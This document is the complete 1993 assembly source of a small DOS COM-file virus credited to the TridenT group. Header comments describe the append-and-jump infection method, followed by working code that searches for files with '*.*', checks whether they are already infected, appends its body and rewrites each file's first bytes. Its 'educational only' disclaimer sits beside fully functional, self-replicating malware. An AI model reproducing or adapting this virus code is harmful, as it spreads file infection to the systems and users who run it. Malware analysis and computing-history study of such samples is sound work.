;                     The Eem-DOS 5-Voorde Virus
;
; Smallest COM file infector which works with te folowing principe:
;
; Before:
;    _____________________  ____________
;   [first 3 bytes of file][rest of file]
;
; After:
;    ____________  ___________________  _____________________
;   [jmp to virus][rest of file][virus][first 3 bytes of file]
;
; This way the virus can restore the first 3 bytes of the file so
; the file will still work.
;
; If you want no registers to change you can add some pushes, but
; it'll make the virus much larger.....
;
;       (C)1993 by [D‡RkR‡Y] / TridenT
;
; BTW This is only a educational source, and this virus should not be
; spread, you may publish this file in it's original form.
; If you intend to spread this virus you will take all the responsibilities
; on youself so the author will not get into trubble.
; If you do not agree with this, destroy this file now.
;
; You can reach me by contacting Byte Hunter. at Hunter BBS (he's the sysop)
; +31-33-634415, and he'll get you in touch with me...
;

_CODE   SEGMENT
        ASSUME  CS:_CODE

        ORG     100h

        LEN     EQU THE_END - VX                ; Length of this babe...

START:
        DB      0E9h,0,0                        ; Jmp to virus
VX:
        CALL    RELATIVE                        ;
RELATIVE:                                       ; Calculate relative offset
        POP     BP                              ;
        SUB     BP,OFFSET RELATIVE              ;

        MOV     DI,SI                           ; Make DI = 100h and save
        PUSH    DI                              ; it as return point.

        LEA     SI,[BP + OLD_BYTES]             ;
        MOV     CL,3                            ; Restore old first bytes.
        REP     MOVSB                           ;

        MOV     DX,SI                           ; Set DX to filespec.
        DEC     AX                              ; Make AX=-1

AGAIN:  ADD     AH,4Fh                          ;
        INT     21h                             ; Search for file(s)
        JNC     OK_1                            ; If non left exit.
        RET                                     ;
OK_1:
        MOV     AH,3Eh                          ; Close old file, also nice
        INT     21h                             ; anti-debug trick!!!!

        MOV     DI,SI                           ; Set DI to save old bytes
        SUB     DI,3                            ;

        CALL    OPEN                            ; Open the victim

        MOV     AH,3Fh                          ; Save first 3 bytes
        CALL    IO                              ;

        CMP     BYTE PTR [DI],0E9h              ; Is it allready infected?
        JE      AGAIN                           ; If so, find next

        MOV     AX,4202h                        ;
        XOR     CX,CX                           ; Set pointer to end of file
        CWD                                     ;
        INT     21h                             ;

        SUB     AX,3                            ;
        ADD     DI,8                            ; Set jump to virus
        MOV     WORD PTR DS:[DI],AX             ;

        MOV     AH,40h                          ;
        MOV     CL,LEN                          ; Write virus
        LEA     DX,[BP + VX]                    ;
        INT     21h                             ;

        CALL    OPEN                            ; Open victim again

        MOV     AH,40h                          ;
        DEC     DI                              ; Write jmp to virus
        CALL    IO                              ;

        RET                                     ; Return to DOS

IO:
        MOV     CL,3                            ;
        MOV     DX,DI                           ; Read or write sub
        INT     21h                             ;
        RET                                     ;

OPEN:
        MOV     AX,3D02h                        ;
        MOV     DX,9Eh                          ; Open file in PSP for
        INT     21h                             ; reading/writing
        XCHG    BX,AX                           ;
        RET                                     ;

OLD_BYTES:      NOP                             ;
                NOP                             ; Old first bytes of file
                RET                             ;

FILE_NAME:      DB      '*.*',0h                ; Infect all files.
                                                ; (and COM files will also
                                                ;  be infected....)

NEW_BYTES       DB      0E9h                    ; Jmp to virus

THE_END:                                        ; Bye Bye!

_CODE   ENDS
        END     START
